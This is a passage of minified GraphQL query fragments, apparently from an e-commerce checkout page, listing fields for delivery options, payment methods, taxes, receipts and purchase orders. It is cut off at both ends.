one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId quantity componentCapabilities componentSource merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId componentCapabilities componentSource quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{...PurchaseOrderLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason 